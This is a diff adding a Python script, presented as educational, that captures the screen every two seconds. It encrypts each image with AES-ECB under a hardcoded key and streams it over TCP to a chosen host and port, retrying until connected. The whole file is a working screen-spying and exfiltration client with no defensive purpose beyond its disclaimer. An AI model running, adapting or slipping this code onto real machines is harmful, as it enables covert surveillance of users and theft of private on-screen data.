@@ -1,0 +1,105 @@
+#!/usr/bin/env python3
+# -!- encoding:utf8 -!-
+#
+# WARNING: This program has been developped for EDUCATIONAL PURPOSE ONLY. You
+#          engage your responsability if you use it in any other situation.
+#
+from io import BytesIO
+from time import sleep
+from struct import pack
+from signal import signal, SIGINT, SIGTERM
+from socket import socket, timeout, AF_INET, SOCK_STREAM
+from base64 import b64encode
+from argparse import ArgumentParser
+from pyscreenshot import grab # PIL + imagemagick needed
+from Crypto.Cipher import AES
+# =============================================================================
+#  CONFIGURATION
+# =============================================================================
+AES_KEY = 'd3Adb3Efc4Feb4Be'
+# =============================================================================
+#  FUNCTIONS
+# =============================================================================
+def interrupt_hdlr(*args):
+    exit(1)
+
+def encrypt(data):
+    cipher = AES.new(AES_KEY, AES.MODE_ECB)
+
+    pad_sz = 16 - len(data) % 16
+    pad_chr = hex(pad_sz)[2]
+    pad = pad_sz * pad_chr.encode()
+
+    return cipher.encrypt(data + pad)
+
+def parse_args():
+    p = ArgumentParser()
+
+    p.add_argument('--host', default='localhost', help="")
+    p.add_argument('--port', default=42042, type=int, help="")
+    p.add_argument('-s', '--screenshot', action='store_true', help="")
+
+    return p.parse_args()
+
+def screenshot():
+    data = BytesIO()
+
+    im = grab()
+    im.save(data, format='png')
+
+    return (im, data.getvalue())
+
+def send(data, sock):
+    size = len(data)
+
+    dsize = pack('>I', size)
+    print("> sending size bytes: {}".format(dsize))
+
+    sock.send(dsize)
+    print("> sending {} bytes".format(size))
+
+    consumed = 0
+    while consumed != size:
+        chunk = sock.send(data[consumed:])
+        consumed += chunk
+        print(">> {} of {} bytes sent.".format(consumed, size))
+
+def main():
+    args = parse_args()
+
+    addr = (args.host, args.port)
+
+    if args.screenshot:
+        im, data = screenshot()
+        im.show()
+
+    else:
+        sock = socket(AF_INET, SOCK_STREAM)
+        sock.settimeout(1.0)
+        while True:
+            try:
+                sock.connect(addr)
+                break
+            except Exception as e:
+                print(e)
+                sleep(2)
+
+        while True:
+            im, data = screenshot()
+            ciphertext = encrypt(data)
+            payload = b'SCN|' + b64encode(ciphertext) + b'|NCS'
+
+            try:
+                send(payload, sock)
+            except Exception as e:
+                print(e)
+
+            sleep(2)
+# =============================================================================
+#  SCRIPT
+# =============================================================================
+if __name__ == '__main__':
+    signal(SIGINT, interrupt_hdlr)
+    signal(SIGTERM, interrupt_hdlr)
+    main()
+    exit(0)
